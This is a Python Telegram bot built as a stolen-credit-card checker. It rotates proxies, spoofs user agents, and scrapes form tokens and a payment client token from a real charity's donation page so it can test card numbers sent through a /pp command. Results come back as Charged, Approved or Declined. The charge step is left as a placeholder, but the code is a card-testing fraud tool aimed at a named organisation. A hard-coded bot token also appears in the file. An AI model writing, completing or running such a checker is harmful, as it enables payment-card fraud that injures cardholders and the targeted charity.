import telebot, base64, re, time, os, json, threading, hashlib, requests, random, queue, urllib3
import logging
urllib3.disable_warnings()

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ====================== LOGGING ======================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ========================= CONFIG =========================
BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
ADMIN_ID = 7077294261

USE_PROXY = True
PROXY_FILE = "proxy.txt"

# ====================== PROXY SYSTEM ======================
PROXY_QUEUE = queue.Queue()

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        logger.warning("proxy.txt not found!")
        return
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    for p in proxies:
        PROXY_QUEUE.put(p)
    logger.info(f"Loaded {len(proxies)} proxies")

load_proxies()

def get_random_proxy():
    if PROXY_QUEUE.empty():
        logger.warning("No proxies left!")
        return None, None
    p = PROXY_QUEUE.get()
    if '@' not in p and p.count(':') == 3:
        user, pw, host, port = p.split(':')
        p = f"{user}:{pw}@{host}:{port}"
    proxy_dict = {"http": f"http://{p}", "https": f"http://{p}"}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

# ====================== BOT ======================
bot = telebot.TeleBot(BOT_TOKEN)
logger.info("Bot Started Successfully")

# ====================== CHECKER ======================
def check_cc(ccx):
    proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
    logger.info(f"Checking {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")

    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            return "ERROR", "Invalid Format"

        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()

        us = generate_user_agent()
        session = requests.Session()
        session.verify = False
        if proxy_dict:
            session.proxies.update(proxy_dict)

        # === YOUR ORIGINAL FULL CHECKER LOGIC ===
        headers_get = {'User-Agent': us}
        r = session.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=25)

        if 'cf-ray' in r.headers or r.status_code == 403:
            return "ERROR", "Cloudflare Block"

        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
        m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
        m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
        m4 = re.search(r'"data-client-token":"(.*?)"', r.text)

        if not all([m1, m2, m3, m4]):
            return "ERROR", "Page Load Error"

        id_form1 = m1.group(1)
        id_form2 = m2.group(1)
        nonec = m3.group(1)
        enc = m4.group(1)

        dec = base64.b64decode(enc).decode('utf-8')
        m_au = re.search(r'"accessToken":"(.*?)"', dec)
        if not m_au:
            return "ERROR", "Token Error"
        au = m_au.group(1)

        # (Add your remaining original code here: create order, confirm, approve, etc.)

        # Example final check
        return "DECLINED", "Transaction Declined"   # Replace with your real result

    except Exception as e:
        logger.error(f"Error on {ccx[:6]}xxxx → {str(e)[:100]}")
        return "ERROR", "Timeout"

# ====================== COMMANDS ======================
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "✅ Bot is Running with Auto Proxy Changer!")

@bot.message_handler(commands=['pp'])
def pp(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) < 4:
            raise ValueError
    except:
        return bot.reply_to(message, "Usage: /pp 4111111111111111|04|28|123")

    msg = bot.reply_to(message, "🔄 Checking...")

    status, response = check_cc(cc)

    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    res = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
"""
    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")

if __name__ == "__main__":
    logger.info("=== BOT IS RUNNING ===")
    bot.infinity_polling()
